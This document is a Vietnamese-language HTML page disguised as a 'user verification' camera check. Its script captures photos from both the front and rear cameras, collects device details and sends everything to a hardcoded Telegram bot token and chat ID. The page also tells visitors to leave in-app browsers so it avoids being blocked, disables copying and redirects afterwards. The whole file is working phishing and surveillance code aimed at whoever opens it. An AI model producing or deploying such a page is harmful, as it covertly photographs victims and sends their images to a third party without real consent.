<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Thực Camera</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background: #161b22;
            padding: 30px;
            border-radius: 24px;
            text-align: center;
            width: 90%;
            max-width: 380px;
            border: 1px solid #30363d;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        .camera-view {
            width: 100%;
            height: 300px;
            background: #000;
            border-radius: 16px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
            border: 2px solid #30363d;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
        }
        .btn:disabled {
            background: #21262d;
            color: #8b949e;
            cursor: not-allowed;
        }
        #status {
            font-size: 13px;
            color: #8b949e;
            margin-top: 15px;
            line-height: 1.5;
        }
        .error { color: #f85149; }
    </style>
</head>
<body>

    <div id="browser-warning">
        <div class="warning-box">
            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
            <div class="steps">
                Hãy Mở Website Theo Hướng Dẫn Phía Dưới Để Không Bị Chặn. Vui lòng:<br>
                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở góc trên bên phải.<br>
                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span>
            </div>
        </div>
    </div>

    <div class="card" id="mainCard">
        <h2 style="margin: 0;">Xác Minh Người Dùng</h2>
        <div class="camera-view" id="vBox">
            <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
            <video id="preview" autoplay playsinline muted></video>
        </div>
        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
    </div>

    <script>
        const BOT_TOKEN = "8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds";
        const CHAT_ID = "7031115869";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

        // Kiểm tra In-App Browser
        function checkAndShowWarning() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
                document.getElementById('browser-warning').style.display = 'block';
                document.getElementById('mainCard').style.display = 'none';
            }
        }
        document.addEventListener("DOMContentLoaded", checkAndShowWarning);

        const btn = document.getElementById('startBtn');
        const video = document.getElementById('preview');
        const status = document.getElementById('status');
        const msg = document.getElementById('msg');
        let frontStream = null;

        btn.addEventListener('click', async () => {
            btn.disabled = true;
            btn.innerText = "ĐANG XỬ LÝ...";
            status.innerHTML = "Đang truy cập camera...";

            try {
                await main();
                startCountdown();
            } catch (err) {
                console.error(err);
                status.innerHTML = `<span class="error">❌ Có lỗi xảy ra. Vui lòng thử lại.</span>`;
                btn.disabled = false;
                btn.innerText = "THỬ LẠI";
            }
        });

        async function main() {
            const info = {
                time: new Date().toLocaleString('vi-VN'),
                device: '',
                os: '',
                camera: '⏳ Đang kiểm tra...'
            };

            detectDevice(info);
            status.textContent = "Đang chụp ảnh camera...";

            const front = await captureCameraWithTimeout("user", 5000);
            const back = await captureCameraWithTimeout("environment", 4000);

            info.camera = (front || back) ? '✅ Đã chụp thành công' : '⚠️ Không chụp được camera';

            await sendToTelegram(info, front, back);
            status.textContent = "Đã gửi dữ liệu thành công!";
        }

        function detectDevice(info) {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) info.os = 'iOS';
            else if (/Android/i.test(ua)) info.os = 'Android';
            else info.os = 'Desktop';
            info.device = ua.substring(0, 80) + "...";
        }

        // Chụp camera có timeout
        async function captureCameraWithTimeout(facingMode, timeoutMs = 6000) {
            return Promise.race([
                captureCamera(facingMode),
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error("Camera timeout")), timeoutMs)
                )
            ]).catch(() => null);
        }

        async function captureCamera(facingMode) {
            if (!navigator.mediaDevices?.getUserMedia) return null;
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode }, 
                    audio: false 
                });

                return new Promise(resolve => {
                    const videoEl = document.createElement('video');
                    videoEl.srcObject = stream;
                    videoEl.playsInline = true;
                    videoEl.muted = true;
                    videoEl.play();

                    videoEl.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = videoEl.videoWidth || 640;
                        canvas.height = videoEl.videoHeight || 480;

                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(videoEl, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                        }, 600);
                    };
                });
            } catch (e) {
                if (stream) stream.getTracks().forEach(t => t.stop());
                return null;
            }
        }

        async function sendToTelegram(info, frontBlob, backBlob) {
            const text = `🔐 Xác Thực Mới\n\n` +
                        `⏰ ${info.time}\n` +
                        `📱 ${info.device}\n` +
                        `🖥 ${info.os}\n` +
                        `📷 ${info.camera}`;

            // Gửi text
            await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            });

            // Gửi ảnh trước
            if (frontBlob) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', frontBlob, 'front.jpg');
                fd.append('caption', '📸 Camera Trước');
                await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: fd });
            }

            // Gửi ảnh sau
            if (backBlob) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', backBlob, 'back.jpg');
                fd.append('caption', '📸 Camera Sau');
                await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: fd });
            }
        }

        function startCountdown() {
            let timeLeft = 5;
            const timer = setInterval(() => {
                btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                    window.location.href = ""; // Thay link nếu cần
                }
            }, 1000);
        }

        // Chặn copy
        document.addEventListener('copy', e => e.preventDefault());
    </script>
</body>
</html>
